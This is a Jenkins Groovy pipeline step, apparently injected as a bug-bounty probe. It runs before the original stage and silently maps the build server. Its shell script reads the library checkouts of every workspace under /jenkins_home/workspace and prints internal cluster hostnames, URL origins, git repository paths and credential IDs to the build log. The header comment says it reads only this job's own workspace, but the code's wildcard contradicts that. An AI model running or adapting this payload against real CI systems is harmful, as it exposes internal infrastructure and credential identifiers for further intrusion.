// Benign, read-only mapping probe for an authorized bug-bounty test (Bugcrowd sap-og24).
// It reads ONLY files the service itself already checked out into this job's own workspace,
// prints DISTINCT NAMES (hostnames / repo paths) and nothing else, makes NO network
// connection, and writes nothing outside the workspace. Then it runs the original stage.
def call(Map parameters) {
  echo "KPEXT_EXECUTED_NONCE_7788 stage=${parameters.stageName}"
  def out = sh(returnStdout: true, script: '''
set +e
N=KP-MAP-7788
for L in /jenkins_home/workspace/*@libs; do
  echo "$N libsroot: $L"
  ls -1 "$L" 2>/dev/null | sed "s|^|$N libdir: |"
done
LIBS=$(echo /jenkins_home/workspace/*@libs)
echo "$N --- distinct in-cluster hostnames referenced by the delivered library source ---"
grep -rhoE "[a-z0-9][a-z0-9.-]*\\.svc\\.cluster\\.local" $LIBS 2>/dev/null | sort -u | sed "s|^|$N host: |"
echo "$N --- distinct URL origins referenced by the delivered library source ---"
grep -rhoE "https?://[A-Za-z0-9][A-Za-z0-9._-]*(:[0-9]+)?" $LIBS 2>/dev/null | sort -u | sed "s|^|$N origin: |"
echo "$N --- distinct git repo paths referenced ---"
grep -rhoE "/git/[A-Za-z0-9._-]+/[A-Za-z0-9._-]+\\.git" $LIBS 2>/dev/null | sort -u | sed "s|^|$N repo: |"
echo "$N --- distinct credential ids referenced ---"
grep -rhoE "[Cc]redentials?Id[^A-Za-z0-9]{1,4}[\\x27\\"][A-Za-z0-9._-]+" $LIBS 2>/dev/null | sed "s|.*[\\x27\\"]||" | sort -u | sed "s|^|$N credid: |"
echo "$N --- done ---"
exit 0
''')
  echo out
  parameters.originalStage()
}
return this
